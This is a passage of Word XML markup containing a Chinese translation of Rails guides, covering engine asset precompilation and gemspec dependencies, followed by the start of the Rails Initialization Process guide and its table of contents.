        <w:t xml:space="preserve">。仅仅是 gem 的 ‘admin’ ‘layout’ 需要这些 ‘asset’.宿主应用程序去’include’ </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"blorg/admin.css"</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样没有意义。在这个解决方案中你需要准确的定义这些 ‘asset’ 来 ’precompilation’。 这里告诉 ‘sprockets’ 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake assets:precompile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>运行的时候添加你的 engine ’asset’。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9C81C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你可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>engine.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 定义 ‘asset’ 来进行预编译</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6960"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="76FE7F78" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="052C801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initializer do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|app|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="173B04D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app.config.assets.precompile += %w(admin.css admin.js)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E358A1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1C6D21D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更多的信息，阅读 </w:t>
      </w:r>
      <w:hyperlink r:id="rId1002" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Asset Pipeline guide</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="21B9247B"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6.5 Other gem dependencies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B94C9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在一个 engine 中的 Gem 依赖应该在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.gemspec</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件中指定，那在 engine 的根目录中。这样做的原因是 engine 可能会作为一个 gem 来安装。如果依赖被指定在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中，这些将不会被传统安装的 gem 认可因此他们将不会被安装，导致 engine 故障。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBB0DE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要指定一个依赖其应该在和传统方式 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>gem install</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 安装 engine 安装期间安装，在 engine中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.gemspec</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件的的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gem::Specification</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 代码块中指定它：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="2407FF08" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C110560" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1651322686"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>s.add_dependency "moo"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="61CF908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要指定一个依赖仅仅作为一个应用程序的 ‘development dependency’，这样指定：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3074106F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72E759FC" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1778867093"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>s.add_development_dependency "moo"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6FA73DC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当运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>bundle install</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 各种依赖将会被安装的时候。这个 gem 的开发模式依赖仅仅在当这个 engine 运行测试的时候使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF9D1C2" w14:textId="78441E3B" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.13、</w:t>
      </w:r>
      <w:hyperlink r:id="rId1003" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>The Rails Initialization Process</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="73F0F0FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This guide explains the internals of the initialization process in Rails as of Rails 3.1. It is an extremely in-depth guide and recommended for advanced Rails developers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5A214D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="355"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BC8FDF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="355"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Using Passenger</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE80C18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A24C365" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1004" w:anchor="1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Launch!</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2F68C8E4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1005" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>bin/rails</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="61EFAC71" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1006" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>railties/lib/rails/cli.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="42B74E2E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1007" w:anchor="1-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>script/rails</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0D3F2078" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1008" w:anchor="1-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>config/boot.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49CD4255" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1009" w:anchor="1-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails/commands.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="62768D32" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1010" w:anchor="1-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>actionpack/lib/action_dispatch.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="79139A97" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1011" w:anchor="1-7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activesupport/lib/active_support.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="001E947C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1012" w:anchor="1-8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activesupport/lib/active_support/lazy_load_hooks.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="303315D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1013" w:anchor="1-9" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activesupport/lib/active_support/inflector/methods.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="32D8B251" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1014" w:anchor="1-10" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>actionpack/lib/action_dispatch.rb</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> cont’d.</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3E3DA8EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1015" w:anchor="1-11" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails/commands/server.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E85EA87" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1016" w:anchor="1-12" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Rack: </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>lib/rack/server.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="52832EDC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1017" w:anchor="1-13" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails::Server#start</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DA98464" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1018" w:anchor="1-14" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>config/environment.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B48BB55" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1019" w:anchor="1-15" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>config/application.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="70477EE6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1020" w:anchor="2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Loading Rails</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="01DC214A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1021" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>railties/lib/rails/all.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="74F5BE5D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
